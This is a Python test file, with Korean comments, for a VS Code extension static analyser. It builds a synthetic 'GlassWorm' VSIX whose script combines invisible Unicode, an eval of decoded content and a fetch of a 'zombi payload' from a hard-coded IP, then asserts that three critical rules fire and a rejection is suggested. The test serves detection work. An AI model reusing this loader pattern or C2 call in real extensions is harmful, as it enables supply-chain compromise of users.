"""GlassWorm 합성 VSIX: 비가시 유니코드 + eval + 알려진 C2 IP -> >=3 critical 룰 -> 거부 제안."""

import json
import os
import zipfile

from vscode_analysis.runner import run_vscode_static_analysis


def _make_glassworm_vsix(tmp_path):
    vsix = os.path.join(tmp_path, "glassworm.vsix")
    manifest = {
        "name": "totally-legit-helper",
        "version": "1.0.0",
        "publisher": "publishingsofficial",
        "activationEvents": ["*"],
        "extensionKind": ["workspace"],
    }
    invisible = "​" * 6  # 비가시 유니코드 6자 -> C-004
    # eval -> C-003, 199.247.10.166 -> C-006
    malicious = (
        "const p = '" + invisible + "';\n"
        "eval(decode(p));\n"
        "fetch('http://199.247.10.166/get_zombi_payload');\n"
    )
    with zipfile.ZipFile(vsix, "w") as zf:
        zf.writestr("extension/package.json", json.dumps(manifest))
        zf.writestr("extension/out/extension.js", malicious)
    return vsix


def test_glassworm_triggers_three_critical_and_reject(tmp_path):
    vsix = _make_glassworm_vsix(str(tmp_path))
    result = run_vscode_static_analysis(vsix)

    assert result["status"] == "ok"
    ids = {f["rule_id"] for f in result["findings"]}
    # C-003, C-004, C-006 발화
    assert {"C-003", "C-004", "C-006"}.issubset(ids)

    critical_findings = [f for f in result["findings"] if f["severity"] == "CRITICAL"]
    assert len(critical_findings) >= 3

    assert result["scan_result"]["critical"] >= 3
    assert result["decision"]["suggest_reject"] is True
    assert result["decision"]["decision"] == "review"
